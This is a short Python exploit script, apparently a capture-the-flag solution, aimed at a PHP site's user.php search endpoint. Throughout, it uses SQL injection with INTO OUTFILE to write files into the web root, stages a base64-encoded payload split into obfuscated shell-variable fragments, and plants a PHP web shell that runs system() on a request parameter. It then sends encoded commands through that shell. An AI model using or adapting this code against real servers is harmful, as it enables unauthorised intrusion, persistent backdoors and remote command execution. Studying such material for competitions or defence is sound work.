import requests
import sys
import base64

if len(sys.argv) < 2:
    print("Usage: python writeup.py host:port")
    sys.exit(1)

url = sys.argv[1]

files = [
    'eval',
    'fa="echo "',
    'fb=cGhwIC1yIC',
    'fc=dmaWxlX3B',
    'fd=1dF9jb250Z',
    'fe=W50cygiZS5',
    'ff=waHAiLCAiP',
    'fg=D9waHAgc3l',
    'fh=zdGVtKFwkX',
    'fi=0dFVFswXSk',
    'fj=7Pz4iKTsn',
    'fk=" |base64"',
    'fl=" -d|sh"',
    'fm=$fa$fb$fc',
    'fn=$fm$fd$fe',
    'fo=$fn$ff$fg',
    'fp=$fo$fh$fi',
    'fq=$fp$fj$fk',
    'fr=$fq$fl',
    'g="eval $fr"',
    'sh -c "\\\\$g";'
]

for file in files:
    requests.get(
        f"http://{url}/user.php",
        params={
            "col": f"\\?\\?/var/www/html/{file}';--\x00",
            "where":"id:`FROM(SELECT 0x3f AS`'`)`,name:`INTO OUTFILE",
            'action': 'search'
        },
    )


requests.get(
        f"http://{url}/user.php",
        params={
            "col": f"\\?\\?/var/www/html/z.php';--\x00",
            "where":"id:`FROM(SELECT 0x3C3F3D602A603B AS`'`)`,name:`INTO OUTFILE",
            'action': 'search'
        },
)

rce = requests.get(f"http://{url}/z.php")
assert rce.status_code == 200

rce = requests.get(f"http://{url}/e.php")
assert rce.status_code != 404, "Exploit not work"

cmd = base64.b64encode(b"""
RET=1
COUNT=0
while [ $RET -ne 0 ]; do
    printf '\\0\\n\\0\\n' | timeout 2 /readflag 2>&1
    RET=$?
    COUNT=$((COUNT + 1))
    echo "Attempt number: $COUNT"
done
echo "[+] Found flag!"

""").decode()


a = requests.get(f"http://{url}/e.php", params={"0": f'echo {cmd} | base64 -d | bash'})
print(a.text)
